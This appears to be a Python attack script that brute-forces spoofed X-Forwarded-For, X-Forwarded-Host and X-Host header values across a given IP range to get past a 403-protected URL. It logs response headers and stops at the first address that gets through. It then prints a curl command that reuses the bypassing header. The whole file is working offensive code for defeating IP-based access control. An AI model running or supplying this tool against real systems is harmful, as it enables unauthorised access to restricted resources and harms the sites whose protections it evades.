import requests
import argparse
from concurrent.futures import ThreadPoolExecutor
from itertools import zip_longest

import iptools
from requests_futures.sessions import FuturesSession
from tqdm import tqdm
import socket



def parse_args():
    parser = argparse.ArgumentParser(
        description="X-Forwarded-For",
    )
    parser.add_argument(
        "-u", dest="url", help="Forbidden URL patch to scan", required=True
    )
    parser.add_argument(
        "-i", dest="ip_range", help="Signe IP or range to use", required=True
    )
    parser.add_argument("-w", "--workers",
                        help="Worker/thread count - default is 100", default=100)
    parser.add_argument("-p", dest="proxy",
                        help="proxy ip address", required=False)
    return parser.parse_args()


def http_status(url, ip_list, proxies):
    http_headers = {
        "Cache-Control": "no-cache, must-revalidate",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.52 "
                      "Safari/537.36",
        "X-Forwarded-For": ip_list,
        "X-Forwarded-Host": url,
        "X-Host": url,
    }
    session = FuturesSession(executor=ThreadPoolExecutor(max_workers=args.workers))
    future = session.get(url, headers=http_headers, proxies={"http": proxies})
    response = future.result()
    with open('log.txt', 'a') as f:
        output = str(response.headers).replace(',', '\n')
        f.write("X_FORWARDED_FOR\n\n" + output + "\n" + str(response.headers.get('X-Forwarded-For')))
        f.write("\n" + "-" * 170 + "\n")
    if response.status_code != 403:
        return "1", ip_list
    else:
        return "0", "0"


def http_hosts(url):
    sub_url = url.replace('http://', '')
    print(sub_url)
    original_ip = socket.gethostbyname(sub_url)
    with open('log.txt', 'a') as f:
        f.write("X_FORWARDED_HOST\n\n" "Original IP address: " + original_ip + "\nOriginal Host: " + url)
        f.write("\n" + "-" * 170 + "\n")


def generate_ips(ip_range):
    try:
        ip_addresses = iptools.IpRangeList(args.ip_range)
        return ip_addresses
    except:
        ip_start = ip_range.split("-")[0]
        ip_end = ip_range.split("-")[1]
        return iptools.IpRange(ip_start, ip_end)


if __name__ == '__main__':



    args = parse_args()

    print("URL:", args.url)
    print("IP range:", args.ip_range)
    ip_addresses = generate_ips(args.ip_range)
    print("IP address count in range:", len(ip_addresses))
    print("Iterations required:", int(-(-len(ip_addresses) // 10)), "\n")

    full = f"args.url"
    url = args.url
    http_hosts(url)

    for ips in tqdm(zip_longest(*[iter(ip_addresses)], fillvalue="")):
        ip_list = ", ".join(filter(None, ips))
        (result, ip_list) = http_status(args.url, ip_list, args.proxy)
        if result == "1":
            print("\n\n[!] Access granted with", ip_list)
            print("[!] curl", args.url, '-H "X-Forwarded-For:', ip_list + '"')
            break